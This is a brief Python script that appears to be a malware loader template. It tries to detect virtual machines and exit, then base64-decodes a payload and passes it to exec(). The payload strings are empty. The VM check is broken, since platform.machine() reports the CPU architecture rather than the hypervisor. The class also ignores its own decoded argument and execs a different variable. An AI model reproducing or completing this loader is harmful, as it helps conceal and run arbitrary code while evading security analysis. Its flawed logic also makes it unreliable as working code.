import ctypes
import base64
import platform
import sys

L = b''


info = platform.machine()

p = b''

class J8code:
    
    def __init__(self,code):
        
        self.code = code
        
    def load(self):
        exec(base64.b64decode(L))


def load():
    if "VMware" in info or "Virtual" in info:
        sys.exit()

    j8=J8code(base64.b64decode(p))
        
    j8.load()

load()